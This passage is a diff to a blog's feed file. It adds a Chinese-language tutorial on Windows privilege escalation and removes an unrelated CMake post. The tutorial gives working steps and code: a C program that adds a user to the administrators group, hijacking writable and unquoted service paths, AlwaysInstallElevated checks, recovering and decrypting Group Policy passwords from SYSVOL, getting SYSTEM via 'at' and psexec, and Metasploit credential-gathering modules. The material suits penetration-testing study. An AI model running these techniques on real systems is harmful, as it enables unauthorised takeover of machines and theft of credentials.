+<li><p>这就意味着你当前用户拥有写权限，这个时候你可以重命名这个exe程序，然后将你的恶意程序放在这个目录下。然后重启这个程序，你的恶意程序就会被执行。这个恶意程序可以使用msfvenom来实现反弹shell或者获取最高权限。</p>
+</li>
+<li><p>下面的poc用于创建一个管理员组的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main ()</div><div class="line">&#123;</div><div class="line">int i;</div><div class="line">    i = system(&quot;net localgroup administrators theusername /add&quot;);</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后我们可以使用mingw编译它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><ul>
+<li>现在我们需要重启服务来让我们的“恶意”程序得以执行，我们可以使用wmic命令或者net命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service NAMEOFSERVICE call startservice</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net stop [service name] &amp;&amp; net start [service name].</div></pre></td></tr></table></figure>
+<ul>
+<li>这个时候你的二进制文件就会以system或者以管理员上下文进行执行。<h3 id="移植你的meterpreter-shell"><a href="#移植你的meterpreter-shell" class="headerlink" title="移植你的meterpreter shell"></a>移植你的meterpreter shell</h3></li>
+<li>如果你的meterpreter 会话不稳定这个时候你可以迁移到一个稳定的服务上，例如移植到winlogon这个服务上，这个服务是以system权限运行的，且一般是一直运行的。我们可以使用如下的命令查看winlogon的PID<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process list brief | find &quot;winlogon&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这个是有可以使用 migrate pid 进行转移。</p>
+<h3 id="有空格的服务路径"><a href="#有空格的服务路径" class="headerlink" title="有空格的服务路径"></a>有空格的服务路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Using WMIC</div><div class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</div><div class="line"></div><div class="line"># Using sc</div><div class="line">sc query</div><div class="line">sc qc service name</div><div class="line"></div><div class="line"># Look for Binary_path_name and see if it is unquoted.</div></pre></td></tr></table></figure>
+<ul>
+<li>如果路径包含了空格且没有被双引号闭合，那么这个服务是容易受攻击的。<h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4></li>
+<li><p>如果可执行文件的路径是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\Program Files\something\winamp.exe</div></pre></td></tr></table></figure>
+</li>
+<li><p>我们可以放如下的程序在这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\program.exe</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>当服务重启的时候将会执行program.exe,我们可以利用任何有空格的目录，不仅仅是program files目录。</p>
+<ul>
+<li>更多的攻击技巧可以看这里：<br><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">http://toshellandback.com/2015/11/24/ms-priv-esc/</a><br>metasploit 也有这个模块  exploit/windows/local/trusted_service_path<h2 id="脆弱的驱动"><a href="#脆弱的驱动" class="headerlink" title="脆弱的驱动"></a>脆弱的驱动</h2></li>
+<li>一些驱动可能是容易受攻击的，我对这块儿还是不是很擅长。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># List all drivers</div><div class="line">driverquery</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
+<p><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">文章详细</a></p>
+<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><ul>
+<li>如果一个机器是加入域了的，当前用户可以查看系统信息卷，这里可能有敏感的文件。</li>
+<li><p>首先我们需要装载这个卷，为了查找到域控机器的ip地址，我们先看一下环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># Output environment-variables</div><div class="line">set</div><div class="line"></div><div class="line"># Look for the following:</div><div class="line">LOGONSERVER=\\NAMEOFSERVER</div><div class="line">USERDNSDOMAIN=WHATEVER.LOCAL</div><div class="line"></div><div class="line"># Look up ip-addres</div><div class="line">nslookup nameofserver.whatever.local</div><div class="line"></div><div class="line"># It will output something like this</div><div class="line">Address:  192.168.1.101</div><div class="line"></div><div class="line"># Now we mount it</div><div class="line">net use z: \\192.168.1.101\SYSVOL</div><div class="line"></div><div class="line"># And enter it</div><div class="line">z:</div><div class="line"></div><div class="line"># Now we search for the groups.xml file</div><div class="line">dir Groups.xml /s</div></pre></td></tr></table></figure>
+</li>
+<li><p>如果发现有password，我们可以使用kali中的工具进行解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gpp-decrypt encryptedpassword</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="从管理员权限到system权限"><a href="#从管理员权限到system权限" class="headerlink" title="从管理员权限到system权限"></a>从管理员权限到system权限</h2><h3 id="xp和xp之前"><a href="#xp和xp之前" class="headerlink" title="xp和xp之前"></a>xp和xp之前</h3><ul>
+<li>如果你是一个有GUI界面的管理员组用户，如果你直接打开cmd.exe的时候，你只是以普通用户运行的这个程序，而当你右键 以管理员身份运行你需要知道管理员密码。<br>你可能不知道，所以这个时候你可以去c:\windows\system32 目录去运行cmd.exe 程序。</li>
+<li><p>我们想要成为system 用户，还需要做一下的工作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">time</div><div class="line"></div><div class="line"># Now we set the time we want the system CMD to start. Probably one minuter after the time.</div><div class="line">at 01:23 /interactive cmd.exe</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后system权限的cmd就出现了。</p>
+<h3 id="vista之后或者更新的系统"><a href="#vista之后或者更新的系统" class="headerlink" title="vista之后或者更新的系统"></a>vista之后或者更新的系统</h3></li>
+<li>你首先需要上传一个psexec.exe 然后运行如下的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psexec -i -s cmd.exe</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h2><ul>
+<li>如果你有个metasploit的meterpreter的会话，直接运行getsystem就可以<h2 id="后渗透模块"><a href="#后渗透模块" class="headerlink" title="后渗透模块"></a>后渗透模块</h2></li>
+<li>metasploit有一些有意思的后渗透模块，你需要有一个meterpreter shell 然后去运行这些后渗透模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/local/service_permissions</div><div class="line"></div><div class="line">post/windows/gather/credentials/gpp</div><div class="line"></div><div class="line">run post/windows/gather/credential_collector </div><div class="line"></div><div class="line">run post/multi/recon/local_exploit_suggester</div><div class="line"></div><div class="line">run post/windows/gather/enum_shares</div><div class="line"></div><div class="line">run post/windows/gather/enum_snmp</div><div class="line"></div><div class="line">run post/windows/gather/enum_applications</div><div class="line"></div><div class="line">run post/windows/gather/enum_logged_on_users</div><div class="line"></div><div class="line">run post/windows/gather/checkvm</div></pre></td></tr></table></figure>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;基本系统信息枚举&quot;&gt;&lt;a href=&quot;#基本系统信息枚举&quot; class=&quot;headerlink&quot; title=&quot;基本系统信息枚举&quot;&gt;&lt;/a&gt;基本系统信息枚举&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有
     
     </summary>
     
@@ -938,34 +1159,6 @@
     
       &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;域安全的知识太多了，整理起来估计都够写一本书了。这边简单整理一些自己笔记的内容。&lt;h4 id=&quot;域&quot;&gt;&lt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Cmake VS Autotools</title>
-    <link href="http://kevien.github.io/2017/09/28/CmakeVSautotools/"/>
-    <id>http://kevien.github.io/2017/09/28/CmakeVSautotools/</id>
-    <published>2017-09-28T02:40:33.000Z</published>
-    <updated>2017-10-29T17:49:59.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统学习。<br></p>
-<h4 id="Cmake使用"><a href="#Cmake使用" class="headerlink" title="Cmake使用"></a>Cmake使用</h4><ul>
-<li><a href="https://www.wikiwand.com/en/CMake" target="_blank" rel="external">wiki关于cmake介绍</a></li>
-<li><a href="https://cmake.org/documentation/" target="_blank" rel="external">官方文档</a> 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P</li>
-<li><a href="https://www.gitbook.com/book/tuannguyen68/learning-cmake-a-beginner-s-guide/details" target="_blank" rel="external">learning-cmake-a-beginner-s-guide/details</a></li>
-<li><a href="http://www.hahack.com/codes/cmake/" target="_blank" rel="external">CMake 入门实战</a></li>
-<li>windows下使用<br><img src="/2017/09/28/CmakeVSautotools/cmake.png" alt=""><h4 id="Cmake-语法简单介绍"><a href="#Cmake-语法简单介绍" class="headerlink" title="Cmake 语法简单介绍"></a>Cmake 语法简单介绍</h4>可以把cmake理解为一种简单的语言，它也有着它的语法和变量。它的语法规则很简单<br><br>1.变量使用${}方式取值<br><br>2.指令（参数1 参数2 。。。）<br><br>3.指令是大小写无关的，参数和变量是大小写敏感的，例如set 和SET 作为指令都是可以的，但是建议全部使用大写的指令。<br><br>4.cmake的语法还是比较灵活且考虑到了各种情况，比如SET(SOURCES_FILES main.c)也可以写成SET(SOURCES_FILES “main.c”)，但是假设一个源文件中的文件名是fu nc.c（中间有了空格），这个时候就有必要加上双引号了。<br><br>5.清理工程，跟经典的autotools系列工具一样，make clean可以对构建结果进行清理。<br><br>6.内部构建和外部构建。内部构建就是直接在根目录下面构建(会在工程目录下产生很多文件，使工程看起来比较乱)，而使用外部构建比如在工程目录下面创建一个build的目录，然后进入build目录下，进行cmake .. 这样生成的文件都在build目录下。推荐是有外部构建，所以一般的构建命令就是进入 build 目录下面，然后 cmake ..  make<br>7.注意cmake 是构建项目的过程,是产生Makefile的过程，也就是生成编译指令的过程，这个过程不会包编译的错误。make才是编译和链接的过程，如果你的代码有问题，或者你的编译指令有有问题(比如未包含动态或者静态的lib)这是时候会产生错误。<br><br>8.ADD_LIBRARY()用来生成动态或者静态链接库的。INCLUDE_DIRECTORY()是用来向工程添加多个特定的头文件搜索路径的，路径之间用空格分开，如果路径中包含了空格，可以使用双引号将它括起来。默认的行为是追加到当前的头文件搜索路径的后面。LINK_DIRECTORIES()添加非标准的共享库搜索路径，TARGET_LINK_LIBRARIES(target  library1 library2),这个指令可以用来为target添加需要连接的共享库.<br><br><img src="/2017/09/28/CmakeVSautotools/makeparam.png" alt=""><br><br><img src="/2017/09/28/CmakeVSautotools/linklib.png" alt=""><br><a href="https://github.com/kevien/cmakesample" target="_blank" rel="external">测试代码见github</a><h4 id="autotools使用"><a href="#autotools使用" class="headerlink" title="autotools使用"></a>autotools使用</h4></li>
-<li><a href="https://geesun.github.io/posts/2015/02/autotool.html" target="_blank" rel="external">使用autotools生成Makefile学习笔记</a></li>
-<li><a href="http://leolovenet.com/downloads/files/autotools.pdf" target="_blank" rel="external">autotools入门</a><h4 id="使用libtool创建库"><a href="#使用libtool创建库" class="headerlink" title="使用libtool创建库"></a>使用libtool创建库</h4><a href="https://www.ibm.com/developerworks/cn/aix/library/1007_wuxh_libtool/index.html" target="_blank" rel="external">使用libtool创建库</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><a href="https://github.com/darx0r/SC-A-Make" target="_blank" rel="external">cmake导致的命令执行问题</a><br><a href="http://thebigdoc.readthedocs.io/en/latest/auto-make-conf.html" target="_blank" rel="external">automake 和 autoconf 使用简明教程</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.youtube.com/watch?v=gYmgbqGfv-8" target="_blank" rel="external">https://www.youtube.com/watch?v=gYmgbqGfv-8</a><br><a href="https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake" target="_blank" rel="external">https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统
     
     </summary>
     
